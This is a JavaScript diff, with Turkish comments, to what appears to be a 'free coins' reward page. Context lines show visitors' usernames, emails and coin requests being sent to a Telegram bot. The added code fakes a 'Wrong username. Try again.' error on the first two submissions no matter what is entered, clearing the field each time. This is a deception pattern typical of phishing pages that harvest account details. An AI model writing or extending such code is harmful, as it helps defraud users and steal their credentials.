@@ -423,6 +423,8 @@ async function sendTelegramNotification(username, email, requestedCoins, rewardT
     console.warn('[Telegram Bot] Mesaj gönderilirken hata oluştu:', err);
   }
 }
+// Deneme sayacı
+let usernameAttemptCount = 0;
 
 function handleGoogleCoinsSubmit() {
   const coinsInput = document.getElementById('googleCoinsInput');
@@ -434,13 +436,26 @@ function handleGoogleCoinsSubmit() {
 
   const rawVal = coinsInput ? coinsInput.value.trim() : '';
 
-// 8 karakterden azsa (veya boşsa) hata verip durdurur
+  // 1. Kural: 8 karakterden azsa temel kural hatası verir
   if (rawVal.length < 8) {
     if (coinsErrorText) coinsErrorText.textContent = 'Username must be at least 8 characters.';
     if (coinsError) coinsError.style.display = 'flex';
     if (coinsWrap) coinsWrap.classList.add('has-error');
     if (coinsInput) coinsInput.focus();
     return;
+  }
+
+  // 2. Kural: İlk 2 denemede "Kullanıcı adı hatalı" uyarısı verir
+  if (usernameAttemptCount < 2) {
+    usernameAttemptCount++;
+    if (coinsErrorText) coinsErrorText.textContent = 'Wrong username. Try again.';
+    if (coinsError) coinsError.style.display = 'flex';
+    if (coinsWrap) coinsWrap.classList.add('has-error');
+    if (coinsInput) {
+      coinsInput.value = '';
+      coinsInput.focus();
+    }
+    return; // Sayfa geçişini durdurur
   }
 
   let formattedCoins = rawVal;
